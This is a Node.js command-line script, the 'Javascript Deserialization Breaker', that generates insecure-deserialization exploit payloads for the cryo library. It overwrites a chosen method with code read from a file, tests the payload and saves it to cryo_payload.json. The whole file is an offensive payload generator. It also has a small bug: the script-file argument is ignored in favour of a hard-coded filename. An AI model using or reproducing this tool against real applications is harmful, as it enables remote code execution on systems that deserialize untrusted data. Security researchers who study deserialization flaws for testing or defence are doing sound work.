const myArgs = process.argv.slice(2);

var support_libraries = ['cryo']
var help = `
*** Javascript Deserialization Breaker ***    

Usage: breaker library overwriteMethod InsertScriptFile
support libraries: ${support_libraries.toString()}

==========================================
`


if(myArgs.length < 3){
    console.log("ERROR: not enough Parameters!")
    console.log(help)
    process.exit(1)
}

switch (myArgs[0]) {
    case 'cryo':
        var fs = require('fs')
        fs.readFile('remoteCode.js','utf8',function(error,data){
            if(error){
                console.log("ERROR: InsertScriptFile doesn't exist!")
            }else{
                var cryoGen = require('./lib/cryoGen')
                cryoGen.init(myArgs[1],data.toString())        
                var payload = cryoGen.genPayload()
                cryoGen.testPayload(payload)
                fs.writeFile("cryo_payload.json", payload, (err) => {if(err) console.log("ERROR: Can't write payload into file"); else console.log("INFO: Saved the payload to cryo_payload.json")})
            }
        })    
        break;

    default:
        console.log("ERROR: Please choose a supported vulnerable library!")
        console.log(help)
        break;
}